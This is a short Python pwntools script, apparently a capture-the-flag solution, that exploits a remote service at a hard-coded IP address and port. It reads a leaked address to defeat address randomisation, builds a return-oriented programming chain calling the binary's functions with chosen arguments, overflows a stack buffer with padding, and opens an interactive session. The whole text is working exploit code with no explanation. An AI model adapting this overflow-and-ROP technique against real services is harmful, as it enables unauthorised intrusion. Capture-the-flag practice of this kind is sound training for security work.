from pwn import *

pwnlib.context.context.clear(arch='amd64', os='linux')

r = remote("65.109.201.174", 5003)

main_address = int(r.recvline().decode().split()[-1], 16)


e = pwnlib.elf.ELF('app/pwn')

main_address_local = e.functions['main'].address
displacement = main_address - main_address_local
e.address += displacement

rop = pwnlib.rop.rop.ROP(e)
rop.call('Hawiya')
rop.call('Jahim')
rop.call('loss', [0x1337c0de, -0x21523f22 - 0x1337c0de])

payload = bytearray()
payload += ('a' * (0x20 + 8)).encode('ascii')
payload += bytes(rop)

print("sending ", payload)

r.sendline(payload)

r.interactive()

r.close()
